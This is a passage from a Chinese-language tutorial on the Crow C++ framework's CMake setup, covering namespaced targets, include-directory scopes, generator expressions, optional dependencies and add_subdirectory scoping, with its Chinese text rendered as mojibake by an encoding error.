<li>âœ… <strong>æœ€ä½³å®è·µ</strong>ï¼šæ€»æ˜¯åˆ›å»ºå‘½åç©ºé—´åˆ«åï¼Œå¯¹å¤–ä½¿ç”¨å‘½åç©ºé—´ç‰ˆæœ¬</li>
<li>âš ï¸ <strong>æ³¨æ„</strong>ï¼šå³ä½¿åœ¨ä¸åŒä½œç”¨åŸŸï¼Œä½¿ç”¨å‘½åç©ºé—´ä¹Ÿæ›´æ¸…æ™°ã€æ›´å®‰å…¨</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆä½¿ç”¨ <code>Crow::Crow</code> å‘½åç©ºé—´æ ¼å¼ï¼Ÿ</strong></p>
<p>a. <strong>CMake æœ€ä½³å®è·µ</strong>ï¼š</p>
<ul>
<li>ç°ä»£ CMake æ¨èä½¿ç”¨ <code>å‘½åç©ºé—´::ç›®æ ‡å</code> çš„æ ¼å¼</li>
<li>è¿™æ˜¯ CMake 3.x å¼•å…¥çš„å‘½åç©ºé—´çº¦å®š</li>
<li>è®¸å¤šç¬¬ä¸‰æ–¹åº“éƒ½éµå¾ªè¿™ä¸ªçº¦å®šï¼ˆå¦‚ <code>asio::asio</code>ã€<code>OpenSSL::SSL</code>ã€<code>Boost::system</code>ï¼‰</li>
</ul>
<p>b. <strong>å®‰è£…å…¼å®¹æ€§</strong>ï¼š</p>
<ul>
<li>å½“é¡¹ç›®å®‰è£…åï¼Œé€šè¿‡ <code>find_package(Crow)</code> å¯¼å…¥æ—¶ï¼Œé€šå¸¸ä¼šæä¾›å‘½åç©ºé—´ç›®æ ‡</li>
<li>ä½¿ç”¨å‘½åç©ºé—´æ ¼å¼å¯ä»¥ä¿æŒæ„å»ºæ—¶å’Œå®‰è£…åçš„ä¸€è‡´æ€§</li>
<li>ç”¨æˆ·ä»£ç å¯ä»¥ç»Ÿä¸€ä½¿ç”¨ <code>Crow::Crow</code>ï¼Œæ— éœ€åŒºåˆ†æ˜¯æ„å»ºæ—¶è¿˜æ˜¯å®‰è£…å</li>
</ul>
<p>c. <strong>é¿å…åç§°å†²çª</strong>ï¼š</p>
<ul>
<li>å‘½åç©ºé—´å¯ä»¥é¿å…ä¸å…¶ä»–é¡¹ç›®çš„ç›®æ ‡åç§°å†²çª</li>
<li>ä¾‹å¦‚ï¼Œå¦‚æœæœ‰å¦ä¸€ä¸ªåº“ä¹Ÿå« <code>Crow</code>ï¼Œä½¿ç”¨ <code>Crow::Crow</code> å¯ä»¥æ˜ç¡®åŒºåˆ†</li>
</ul>
<p>d. <strong>ä»£ç å¯è¯»æ€§</strong>ï¼š</p>
<ul>
<li><code>Crow::Crow</code> æ˜ç¡®è¡¨ç¤ºè¿™æ˜¯ Crow é¡¹ç›®çš„ Crow åº“</li>
<li>æé«˜ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§</li>
</ul>
<p><strong>å®é™…ä½¿ç”¨ç¤ºä¾‹å’Œå¥½å¤„å¯¹æ¯”</strong>ï¼š</p>
<p><strong>ç¤ºä¾‹ 1ï¼šä»£ç ä¸€è‡´æ€§ - æ„å»ºæ—¶ vs å®‰è£…å</strong></p>
<p>åœºæ™¯ï¼šä½ çš„é¡¹ç›®å¯èƒ½æœ‰ä¸¤ç§ä½¿ç”¨ Crow çš„æ–¹å¼</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ–¹å¼ Aï¼šä½œä¸ºå­é¡¹ç›®ï¼ˆæ„å»ºæ—¶ï¼‰
add_subdirectory(third_party/Crow)
target_link_libraries(myapp Crow::Crow)  # âœ… ä½¿ç”¨å‘½åç©ºé—´

# æ–¹å¼ Bï¼šé€šè¿‡ find_packageï¼ˆå®‰è£…åï¼‰
find_package(Crow REQUIRED)
target_link_libraries(myapp Crow::Crow)  # âœ… åŒæ ·çš„å†™æ³•ï¼
</code></pre>
<p><strong>å¥½å¤„</strong>ï¼šæ— è®º Crow æ˜¯ä½œä¸ºå­é¡¹ç›®è¿˜æ˜¯å·²å®‰è£…çš„åŒ…ï¼Œä»£ç å†™æ³•å®Œå…¨ä¸€è‡´ï¼</p>
<p><strong>ç¤ºä¾‹ 2ï¼šé¿å…åç§°å†²çª</strong></p>
<p>å‡è®¾ä½ çš„é¡¹ç›®åŒæ—¶ä½¿ç”¨å¤šä¸ªåº“ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># é¡¹ç›®åŒæ—¶ä½¿ç”¨ Crow å’Œå¦ä¸€ä¸ªå« "Crow" çš„åº“ï¼ˆå‡è®¾ï¼‰
add_subdirectory(third_party/Crow)
add_subdirectory(third_party/OtherCrow)  # å¦ä¸€ä¸ªåº“ä¹Ÿå« Crow

# ä½¿ç”¨å‘½åç©ºé—´ - æ¸…æ™°æ˜ç¡®
target_link_libraries(myapp 
    Crow::Crow        # âœ… æ˜ç¡®æ˜¯ Crow é¡¹ç›®çš„åº“
    OtherCrow::Crow   # âœ… æ˜ç¡®æ˜¯ OtherCrow é¡¹ç›®çš„åº“
)

# ä¸ä½¿ç”¨å‘½åç©ºé—´ - å®¹æ˜“æ··æ·†
target_link_libraries(myapp 
    Crow    # âŒ è¿™æ˜¯å“ªä¸ª Crowï¼Ÿ
    Crow    # âŒ å†²çªï¼CMake ä¼šæŠ¥é”™
)
</code></pre>
<p><strong>å¥½å¤„</strong>ï¼šå‘½åç©ºé—´é¿å…äº†ç›®æ ‡åç§°å†²çªï¼Œä»£ç æ›´æ¸…æ™°ã€‚</p>
<p><strong>ç¤ºä¾‹ 3ï¼šä¸ç¬¬ä¸‰æ–¹åº“é£æ ¼ä¸€è‡´</strong></p>
<p>åœ¨ Crow é¡¹ç›®ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰ä¾èµ–åº“éƒ½ä½¿ç”¨å‘½åç©ºé—´ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt ä¸­çš„å®é™…ä»£ç 
target_link_libraries(Crow INTERFACE
    asio::asio        # âœ… Asio åº“ä½¿ç”¨å‘½åç©ºé—´
    ZLIB::ZLIB       # âœ… ZLib åº“ä½¿ç”¨å‘½åç©ºé—´
    OpenSSL::SSL     # âœ… OpenSSL åº“ä½¿ç”¨å‘½åç©ºé—´
)
</code></pre>
<p>åœ¨ examples ä¸­ï¼Œä¹Ÿä½¿ç”¨å‘½åç©ºé—´ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># examples/CMakeLists.txt ä¸­çš„å®é™…ä»£ç 
target_link_libraries(basic_example PUBLIC Crow::Crow)  # âœ… é£æ ¼ä¸€è‡´
</code></pre>
<p><strong>å¥½å¤„</strong>ï¼šä»£ç é£æ ¼ç»Ÿä¸€ï¼Œç¬¦åˆç°ä»£ CMake æœ€ä½³å®è·µï¼Œæé«˜å¯è¯»æ€§ã€‚</p>
<p><strong>ç¤ºä¾‹ 4ï¼šIDE å’Œå·¥å…·æ”¯æŒæ›´å¥½</strong></p>
<p>ä½¿ç”¨å‘½åç©ºé—´çš„ç›®æ ‡ï¼ŒIDE å’Œ CMake å·¥å…·èƒ½æ›´å¥½åœ°è¯†åˆ«ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># ä½¿ç”¨å‘½åç©ºé—´ - IDE å¯ä»¥è‡ªåŠ¨è¡¥å…¨å’Œæ£€æŸ¥
target_link_libraries(myapp Crow::Crow)  # âœ… IDE çŸ¥é“è¿™æ˜¯ Crow é¡¹ç›®çš„ç›®æ ‡

# ä¸ä½¿ç”¨å‘½åç©ºé—´ - å¯èƒ½ä¸å…¶ä»–ç›®æ ‡æ··æ·†
target_link_libraries(myapp Crow)  # âŒ å¯èƒ½æ˜¯ä»»ä½•å« Crow çš„ç›®æ ‡
</code></pre>
<p><strong>å¥½å¤„</strong>ï¼šæ›´å¥½çš„å¼€å‘ä½“éªŒï¼Œå·¥å…·æ”¯æŒæ›´å®Œå–„ã€‚</p>
<p><strong>ç¤ºä¾‹ 5ï¼šå®‰è£…é…ç½®æ–‡ä»¶ä¸­çš„ä½¿ç”¨</strong></p>
<p>æŸ¥çœ‹ <code>cmake/CrowConfig.cmake.in</code>ï¼ˆå®‰è£…é…ç½®æ–‡ä»¶ï¼‰ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># ç¬¬ 28 è¡Œï¼šè·å– Crow::Crow çš„å±æ€§
get_target_property(_CROW_ILL Crow::Crow INTERFACE_LINK_LIBRARIES)
get_target_property(_CROW_ICD Crow::Crow INTERFACE_COMPILE_DEFINITIONS)

# ç¬¬ 52 è¡Œï¼šè®¾ç½® Crow::Crow çš„å±æ€§
set_target_properties(Crow::Crow PROPERTIES
    INTERFACE_COMPILE_DEFINITIONS "${_CROW_ICD}"
)
</code></pre>
<p>å®‰è£…åçš„åŒ…å¿…é¡»ä½¿ç”¨ <code>Crow::Crow</code>ï¼Œå¦‚æœæ„å»ºæ—¶ä¸ä½¿ç”¨å‘½åç©ºé—´ï¼Œä¼šå¯¼è‡´ï¼š</p>
<ul>
<li>æ„å»ºæ—¶ç”¨ <code>Crow</code></li>
<li>å®‰è£…åç”¨ <code>Crow::Crow</code></li>
<li>ä»£ç ä¸ä¸€è‡´ï¼Œå®¹æ˜“å‡ºé”™</li>
</ul>
<p><strong>å¥½å¤„</strong>ï¼šæ„å»ºæ—¶å’Œå®‰è£…åä½¿ç”¨ç›¸åŒçš„ç›®æ ‡åç§°ï¼Œé¿å…æ··æ·†ã€‚</p>
<p><strong>æ€»ç»“å¯¹æ¯”è¡¨</strong>ï¼š</p>













































<table><thead><tr><th>ç‰¹æ€§</th><th>ä½¿ç”¨ <code>Crow::Crow</code></th><th>ä½¿ç”¨ <code>Crow</code></th></tr></thead><tbody><tr><td>æ„å»ºæ—¶å¯ç”¨</td><td>âœ… æ˜¯</td><td>âœ… æ˜¯</td></tr><tr><td>å®‰è£…åå¯ç”¨</td><td>âœ… æ˜¯</td><td>âŒ å¯èƒ½ä¸è¡Œ</td></tr><tr><td>é¿å…åç§°å†²çª</td><td>âœ… æ˜¯</td><td>âŒ å¦</td></tr><tr><td>ä»£ç ä¸€è‡´æ€§</td><td>âœ… é«˜</td><td>âŒ ä½</td></tr><tr><td>ç¬¦åˆç°ä»£ CMake</td><td>âœ… æ˜¯</td><td>âŒ å¦</td></tr><tr><td>IDE æ”¯æŒ</td><td>âœ… æ›´å¥½</td><td>âš ï¸ ä¸€èˆ¬</td></tr><tr><td>ä¸ç¬¬ä¸‰æ–¹åº“é£æ ¼ä¸€è‡´</td><td>âœ… æ˜¯</td><td>âŒ å¦</td></tr></tbody></table>
<p><strong>é‡è¦æ¾„æ¸…ï¼šCMake å‘½åç©ºé—´ vs C++ å‘½åç©ºé—´</strong></p>
<p>âš ï¸ <strong>å…³é”®åŒºåˆ«</strong>ï¼šCMake çš„ <code>Crow::Crow</code> å‘½åç©ºé—´å’Œ C++ ä»£ç ä¸­çš„å‘½åç©ºé—´æ˜¯<strong>å®Œå…¨ç‹¬ç«‹</strong>çš„ï¼Œäº’ä¸å½±å“ï¼</p>
<p><strong>CMake å‘½åç©ºé—´</strong>ï¼ˆåªåœ¨ CMakeLists.txt ä¸­ä½¿ç”¨ï¼‰ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt ä¸­
add_library(Crow::Crow ALIAS Crow)  # CMake ç›®æ ‡åç§°
target_link_libraries(myapp Crow::Crow)  # é“¾æ¥æ—¶ä½¿ç”¨
</code></pre>
<p><strong>C++ å‘½åç©ºé—´</strong>ï¼ˆåœ¨ C++ æºä»£ç ä¸­ä½¿ç”¨ï¼‰ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// C++ æºä»£ç ä¸­</span>
<span class="hljs-keyword">namespace</span> crow {  <span class="hljs-comment">// C++ å‘½åç©ºé—´ï¼ˆå°å†™ï¼‰</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> { ... };
}

<span class="hljs-comment">// ä½¿ç”¨æ—¶</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"crow.h"</span></span>
crow::App app;  <span class="hljs-comment">// âœ… ä½¿ç”¨ C++ å‘½åç©ºé—´ crowï¼ˆå°å†™ï¼‰</span>
</code></pre>
<p><strong>å®é™…ä¾‹å­</strong>ï¼š</p>
<p>æŸ¥çœ‹ <code>examples/example.cpp</code> çš„å®é™…ä»£ç ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"crow.h"</span></span>

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    crow::App&lt;ExampleMiddleware&gt; app;  <span class="hljs-comment">// âœ… C++ å‘½åç©ºé—´ï¼šcrowï¼ˆå°å†™ï¼‰</span>
    crow::json::wvalue x;              <span class="hljs-comment">// âœ… C++ å‘½åç©ºé—´ï¼šcrowï¼ˆå°å†™ï¼‰</span>
    crow::request req;                 <span class="hljs-comment">// âœ… C++ å‘½åç©ºé—´ï¼šcrowï¼ˆå°å†™ï¼‰</span>
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>è€Œåœ¨ <code>examples/CMakeLists.txt</code> ä¸­ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">target_link_libraries(basic_example PUBLIC Crow::Crow)  # âœ… CMake å‘½åç©ºé—´ï¼šCrow::Crowï¼ˆå¤§å†™ï¼‰
</code></pre>
<p><strong>ä¸¤è€…å¯¹æ¯”</strong>ï¼š</p>



































<table><thead><tr><th>å±‚é¢</th><th>CMake å‘½åç©ºé—´</th><th>C++ å‘½åç©ºé—´</th></tr></thead><tbody><tr><td>ä½¿ç”¨ä½ç½®</td><td>CMakeLists.txt</td><td>.cpp/.h æºä»£ç </td></tr><tr><td>æ ¼å¼</td><td><code>Crow::Crow</code>ï¼ˆå¤§å†™ï¼‰</td><td><code>crow</code>ï¼ˆå°å†™ï¼‰</td></tr><tr><td>ä½œç”¨</td><td>æ„å»ºç³»ç»Ÿç›®æ ‡æ ‡è¯†</td><td>ä»£ç ç»„ç»‡ã€é¿å…ç¬¦å·å†²çª</td></tr><tr><td>å½±å“èŒƒå›´</td><td>æ„å»ºé…ç½®</td><td>ç¼–è¯‘åçš„ä»£ç </td></tr><tr><td>æ˜¯å¦ç›¸å…³</td><td>âŒ å®Œå…¨ç‹¬ç«‹</td><td>âŒ å®Œå…¨ç‹¬ç«‹</td></tr></tbody></table>
<p><strong>æ€»ç»“</strong>ï¼š</p>
<ul>
<li>CMake çš„ <code>Crow::Crow</code> åªå½±å“æ„å»ºç³»ç»Ÿï¼Œä¸å½±å“ C++ ä»£ç </li>
<li>C++ ä»£ç ä¸­çš„ <code>namespace crow</code> æ˜¯åº“çš„ç¼–ç¨‹æ¥å£ï¼Œä¸ CMake æ— å…³</li>
<li>ä½ å¯ä»¥ä½¿ç”¨ <code>Crow::Crow</code>ï¼ˆCMakeï¼‰é“¾æ¥åº“ï¼Œç„¶ååœ¨ä»£ç ä¸­ä½¿ç”¨ <code>crow::App</code>ï¼ˆC++ï¼‰</li>
<li>ä¸¤è€…å¯ä»¥æœ‰ä¸åŒçš„å‘½åé£æ ¼ï¼Œäº’ä¸å¹²æ‰°</li>
</ul>
</li>
<li>
<p><strong>åŒ…å«ç›®å½•è¯¦è§£</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">target_include_directories(Crow
    INTERFACE
        $&lt;BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}/include&gt;
        $&lt;INSTALL_INTERFACE:include&gt;
)
</code></pre>
<p><strong><code>target_include_directories</code> çš„æœ¬è´¨</strong>ï¼š</p>
<p><strong>æ ¸å¿ƒä½œç”¨</strong>ï¼šå‘Šè¯‰ç¼–è¯‘å™¨åœ¨å“ªé‡Œæ‰¾å¤´æ–‡ä»¶</p>
<p><code>target_include_directories</code> çš„æœ¬è´¨æ˜¯<strong>è®¾ç½®ç¼–è¯‘å™¨çš„å¤´æ–‡ä»¶æœç´¢è·¯å¾„</strong>ã€‚å®ƒä¼šåœ¨ç¼–è¯‘æ—¶è½¬æ¢ä¸ºç¼–è¯‘å™¨çš„ <code>-I</code> é€‰é¡¹ï¼ˆGCC/Clangï¼‰æˆ– <code>/I</code> é€‰é¡¹ï¼ˆMSVCï¼‰ã€‚</p>
<p><strong>ä» CMake åˆ°ç¼–è¯‘å™¨çš„è½¬æ¢</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt
target_include_directories(Crow INTERFACE include/)
</code></pre>
<p>è½¬æ¢ä¸ºå®é™…çš„ç¼–è¯‘å™¨å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># GCC/Clang</span>
g++ -I/path/to/include -c example.cpp

<span class="hljs-comment"># MSVC</span>
cl.exe /I<span class="hljs-string">"C:\path\to\include"</span> example.cpp
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦è¿™ä¸ªï¼Ÿ</strong></p>
<p>å½“ä½ çš„ä»£ç å†™ <code>#include "crow.h"</code> æ—¶ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"crow.h"</span>  <span class="hljs-comment">// ç¼–è¯‘å™¨éœ€è¦çŸ¥é“åœ¨å“ªé‡Œæ‰¾è¿™ä¸ªæ–‡ä»¶</span></span>
</code></pre>
<p>ç¼–è¯‘å™¨ä¼šï¼š</p>
<ol>
<li>å…ˆåœ¨å½“å‰ç›®å½•æŸ¥æ‰¾ <code>crow.h</code></li>
<li>å¦‚æœæ‰¾ä¸åˆ°ï¼Œåœ¨ <code>target_include_directories</code> æŒ‡å®šçš„è·¯å¾„ä¸­æŸ¥æ‰¾</li>
<li>å¦‚æœè¿˜æ‰¾ä¸åˆ°ï¼ŒæŠ¥é”™ï¼š<code>fatal error: 'crow.h' file not found</code></li>
</ol>
<p><strong>INTERFACEã€PUBLICã€PRIVATE çš„åŒºåˆ«</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># å‡è®¾æœ‰ä¸€ä¸ªåº“ MyLib
add_library(MyLib STATIC mylib.cpp)

# PRIVATEï¼šåªç»™è‡ªå·±ç”¨ï¼Œä¸ä¼ æ’­ç»™ä¾èµ–è€…
target_include_directories(MyLib PRIVATE 
    ${CMAKE_CURRENT_SOURCE_DIR}/private_headers  # åªæœ‰ MyLib è‡ªå·±ç”¨
)

# INTERFACEï¼šåªç»™ä¾èµ–è€…ç”¨ï¼Œè‡ªå·±ä¸ç”¨
target_include_directories(MyLib INTERFACE 
    ${CMAKE_CURRENT_SOURCE_DIR}/public_headers   # ä¾èµ– MyLib çš„ç›®æ ‡å¯ä»¥ç”¨
)

# PUBLICï¼šæ—¢ç»™è‡ªå·±ç”¨ï¼Œä¹Ÿä¼ æ’­ç»™ä¾èµ–è€…
target_include_directories(MyLib PUBLIC 
    ${CMAKE_CURRENT_SOURCE_DIR}/headers          # MyLib å’Œä¾èµ–è€…éƒ½èƒ½ç”¨
)
</code></pre>
<p><strong>å®é™…ä¾‹å­</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># MyLib çš„ CMakeLists.txt
add_library(MyLib STATIC mylib.cpp)
target_include_directories(MyLib PUBLIC include/)  # PUBLICï¼šä¼ æ’­ç»™ä½¿ç”¨è€…

# ä½ çš„é¡¹ç›®çš„ CMakeLists.txt
add_executable(myapp main.cpp)
target_link_libraries(myapp MyLib)  # é“¾æ¥ MyLib

# ç¼–è¯‘ myapp æ—¶ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ·»åŠ  -I/path/to/MyLib/include
# æ‰€ä»¥ main.cpp å¯ä»¥å†™ï¼š
# #include "mylib.h"  // âœ… èƒ½æ‰¾åˆ°ï¼Œå› ä¸º MyLib çš„ PUBLIC include è·¯å¾„è¢«ä¼ æ’­äº†
</code></pre>
<p><strong>Crow é¡¹ç›®ä¸­çš„å®é™…ä½¿ç”¨</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">target_include_directories(Crow
    INTERFACE
        $&lt;BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}/include&gt;
        $&lt;INSTALL_INTERFACE:include&gt;
)
</code></pre>
<p><strong>è§£æ</strong>ï¼š</p>
<ol>
<li><strong><code>INTERFACE</code></strong>ï¼š
<ul>
<li>Crow æ˜¯ header-only åº“ï¼Œæ²¡æœ‰è‡ªå·±çš„æºæ–‡ä»¶éœ€è¦ç¼–è¯‘</li>
<li>æ‰€ä»¥ç”¨ <code>INTERFACE</code>ï¼Œåªç»™ä½¿ç”¨è€…æä¾›å¤´æ–‡ä»¶è·¯å¾„</li>
</ul>
</li>
<li><strong><code>$&lt;BUILD_INTERFACE:...&gt;</code></strong>ï¼š
<ul>
<li>è¿™æ˜¯ CMake çš„ç”Ÿæˆå™¨è¡¨è¾¾å¼ï¼ˆGenerator Expressionï¼‰</li>
<li>æ„å»ºæ—¶ï¼ˆ<code>cmake --build</code>ï¼‰ä½¿ç”¨ï¼š<code>${CMAKE_CURRENT_SOURCE_DIR}/include</code></li>
<li>å³ï¼š<code>C:\Users\notfr\projects\Crow\include</code></li>
</ul>
</li>
<li><strong><code>$&lt;INSTALL_INTERFACE:...&gt;</code></strong>ï¼š
<ul>
<li>å®‰è£…åï¼ˆ<code>cmake --install</code>ï¼‰ä½¿ç”¨ï¼š<code>include</code></li>
<li>å³ï¼šå®‰è£…ç›®å½•ä¸‹çš„ <code>include</code> æ–‡ä»¶å¤¹</li>
<li>ä¾‹å¦‚ï¼š<code>C:\Program Files\Crow\include</code></li>
</ul>
</li>
</ol>
<p><strong>å®é™…æ•ˆæœ</strong>ï¼š</p>
<p>å½“ä½ åœ¨ä»£ç ä¸­å†™ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"crow.h"</span>  <span class="hljs-comment">// æˆ– #include &lt;crow.h&gt;</span></span>
</code></pre>
<p>ç¼–è¯‘å™¨ä¼šï¼š</p>
<ol>
<li>æ„å»ºæ—¶ï¼šåœ¨ <code>C:\Users\notfr\projects\Crow\include</code> ä¸­æŸ¥æ‰¾</li>
<li>å®‰è£…åï¼šåœ¨ <code>C:\Program Files\Crow\include</code> ä¸­æŸ¥æ‰¾</li>
</ol>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦ä¸¤ä¸ªä¸åŒçš„è·¯å¾„ï¼Ÿ</strong></p>
<ul>
<li><strong>æ„å»ºæ—¶</strong>ï¼šå¤´æ–‡ä»¶åœ¨æºç ç›®å½• <code>include/</code></li>
<li><strong>å®‰è£…å</strong>ï¼šå¤´æ–‡ä»¶è¢«å®‰è£…åˆ°ç³»ç»Ÿç›®å½• <code>include/</code></li>
<li>ä½¿ç”¨ç”Ÿæˆå™¨è¡¨è¾¾å¼å¯ä»¥è‡ªåŠ¨åˆ‡æ¢ï¼Œæ— éœ€æ‰‹åŠ¨ä¿®æ”¹</li>
</ul>
<p><strong>æœ¬è´¨æ€»ç»“</strong>ï¼š</p>
<p><code>target_include_directories</code> çš„æœ¬è´¨æ˜¯ï¼š</p>
<ol>
<li><strong>è®¾ç½®ç¼–è¯‘å™¨çš„å¤´æ–‡ä»¶æœç´¢è·¯å¾„</strong>ï¼ˆè½¬æ¢ä¸º <code>-I</code> æˆ– <code>/I</code> é€‰é¡¹ï¼‰</li>
<li><strong>æ§åˆ¶è·¯å¾„çš„ä¼ æ’­</strong>ï¼ˆPRIVATE/INTERFACE/PUBLICï¼‰</li>
<li><strong>æ”¯æŒæ„å»ºæ—¶å’Œå®‰è£…åçš„è·¯å¾„åˆ‡æ¢</strong>ï¼ˆç”Ÿæˆå™¨è¡¨è¾¾å¼ï¼‰</li>
<li><strong>è®© <code>#include</code> èƒ½æ‰¾åˆ°å¤´æ–‡ä»¶</strong></li>
</ol>
<p>æ²¡æœ‰å®ƒï¼Œç¼–è¯‘å™¨å°±ä¸çŸ¥é“åœ¨å“ªé‡Œæ‰¾å¤´æ–‡ä»¶ï¼Œ<code>#include "crow.h"</code> ä¼šå¤±è´¥ã€‚</p>
</li>
</ol>
<p><strong>è¿™æ˜¯ä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•æ‰§è¡Œçš„å…³é”®åŸå› ä¹‹ä¸€</strong>ï¼š<code>Crow::Crow</code> ç›®æ ‡å¿…é¡»åœ¨æ ¹ç›®å½•çš„ CMakeLists.txt ä¸­å®šä¹‰ï¼Œ<code>examples</code> ç›®å½•ä¸­çš„ä»£ç ä¾èµ–è¿™ä¸ªç›®æ ‡ã€‚</p>
<h4 data-id="heading-6">1.4 ä¾èµ–åº“æŸ¥æ‰¾å’Œé“¾æ¥</h4>
<h5 data-id="heading-7">Asio åº“ï¼ˆé»˜è®¤ï¼‰</h5>
<pre><code class="hljs language-cmake" lang="cmake">else()
    find_package(asio REQUIRED)
    target_link_libraries(Crow
        INTERFACE
            asio::asio
    )
    target_compile_definitions(Crow INTERFACE ASIO_NO_DEPRECATED)
endif()
</code></pre>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæŸ¥æ‰¾å¹¶é“¾æ¥ Asio å¼‚æ­¥ I/O åº“</li>
<li><strong>ä¾èµ–</strong>ï¼šä½¿ç”¨è‡ªå®šä¹‰çš„ <code>Findasio.cmake</code> æ¨¡å—ï¼ˆä½äº <code>cmake/Findasio.cmake</code>ï¼‰</li>
</ul>
<h5 data-id="heading-8">å¯é€‰ä¾èµ–</h5>
<pre><code class="hljs language-cmake" lang="cmake">if(CROW_ENABLE_COMPRESSION)
    find_package(ZLIB REQUIRED)
    target_link_libraries(Crow INTERFACE ZLIB::ZLIB)
    target_compile_definitions(Crow INTERFACE CROW_ENABLE_COMPRESSION)
endif()

if(CROW_ENABLE_SSL)
    find_package(OpenSSL REQUIRED)
    target_link_libraries(Crow INTERFACE OpenSSL::SSL)
    target_compile_definitions(Crow INTERFACE CROW_ENABLE_SSL)
endif()
</code></pre>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæ ¹æ®ç¼–è¯‘é€‰é¡¹æ¡ä»¶æ€§åœ°æ·»åŠ å‹ç¼©å’Œ SSL æ”¯æŒ</li>
<li><strong>å˜é‡ä¼ é€’</strong>ï¼šè¿™äº›é€‰é¡¹ä¼šå½±å“ <code>CROW_FEATURES</code> å˜é‡ï¼Œ<code>examples</code> ç›®å½•ä¼šæ£€æŸ¥è¿™ä¸ªå˜é‡</li>
</ul>
<h4 data-id="heading-9">1.5 å­é¡¹ç›®é›†æˆ</h4>
<pre><code class="hljs language-cmake" lang="cmake"># Examples
if(CROW_BUILD_EXAMPLES)
    add_subdirectory(examples)
endif()
</code></pre>
<p><strong><code>add_subdirectory</code> çš„æœ¬è´¨</strong>ï¼š</p>
<p><strong>æ ¸å¿ƒä½œç”¨</strong>ï¼šå°†å­ç›®å½•çš„ CMakeLists.txt åŒ…å«åˆ°å½“å‰æ„å»ºä¸­ï¼Œåˆ›å»ºä¸€ä¸ªå­ä½œç”¨åŸŸ</p>
<p><code>add_subdirectory</code> çš„æœ¬è´¨æ˜¯<strong>åœ¨å½“å‰ CMake é…ç½®è¿‡ç¨‹ä¸­ï¼Œåˆ‡æ¢åˆ°æŒ‡å®šå­ç›®å½•ï¼Œæ‰§è¡Œè¯¥ç›®å½•ä¸‹çš„ CMakeLists.txtï¼Œç„¶åè¿”å›</strong>ã€‚å®ƒåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ä½œç”¨åŸŸï¼Œä½†ä¿æŒäº†ä¸çˆ¶ç›®å½•çš„ä¸Šä¸‹æ–‡è”ç³»ã€‚</p>
<p><strong>æ‰§è¡Œæµç¨‹</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ ¹ç›®å½• CMakeLists.txt
add_library(Crow INTERFACE)           # 1. åˆ›å»º Crow ç›®æ ‡
set(MY_VAR "value")                  # 2. è®¾ç½®å˜é‡
add_subdirectory(examples)           # 3. åˆ‡æ¢åˆ° examples ç›®å½•
# 4. æ‰§è¡Œ examples/CMakeLists.txt
# 5. è¿”å›æ ¹ç›®å½•ï¼Œç»§ç»­æ‰§è¡Œ
</code></pre>
<p><strong>å…³é”®æœºåˆ¶</strong>ï¼š</p>
<ol>
<li>
<p><strong>æ¡ä»¶åŒ…å«</strong>ï¼šåªæœ‰å½“ <code>CROW_BUILD_EXAMPLES</code> é€‰é¡¹ä¸º <code>ON</code> æ—¶ï¼Œæ‰ä¼šåŒ…å« <code>examples</code> å­ç›®å½•</p>
</li>
<li>
<p><strong>ä½œç”¨åŸŸå’Œå˜é‡ä¼ é€’</strong>ï¼š</p>
<p><strong>çˆ¶ç›®å½• â†’ å­ç›®å½•ï¼ˆå¯è§ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ ¹ç›®å½• CMakeLists.txt
set(PARENT_VAR "parent_value")     # çˆ¶ç›®å½•å˜é‡
add_library(Crow INTERFACE)        # çˆ¶ç›®å½•ç›®æ ‡
add_subdirectory(examples)         # è¿›å…¥å­ç›®å½•

# examples/CMakeLists.txt
message(STATUS ${PARENT_VAR})      # âœ… å¯ä»¥è®¿é—®ï¼šè¾“å‡º "parent_value"
target_link_libraries(myapp Crow)  # âœ… å¯ä»¥è®¿é—®ï¼šCrow ç›®æ ‡å¯è§
</code></pre>
<p><strong>å­ç›®å½• â†’ çˆ¶ç›®å½•ï¼ˆä¸å¯è§ï¼‰</strong>ï¼š</p>
